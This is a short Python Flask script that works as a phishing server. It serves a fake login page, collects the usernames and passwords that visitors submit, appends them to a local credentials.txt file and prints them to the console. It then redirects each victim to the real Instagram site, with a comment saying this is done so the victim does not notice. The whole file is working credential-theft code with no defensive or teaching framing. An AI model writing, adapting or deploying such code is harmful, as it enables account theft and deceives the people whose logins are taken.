
from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

@app.route('/')
def index():
    """Serve the fake login page."""
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    """Capture username and password."""
    # Get data from the form
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Save to a file (credentials.txt)
    with open('credentials.txt', 'a') as f:
        f.write(f"Username: {username} | Password: {password}\n")
    
    print(f"[+] Captured: {username}:{password}")
    
    # Redirect user to real Instagram so they don't notice
    return redirect('https://www.instagram.com/')

if __name__ == '__main__':
    # Run the server on port 80 (or any available port)
    app.run(host='0.0.0.0', port=80, debug=False)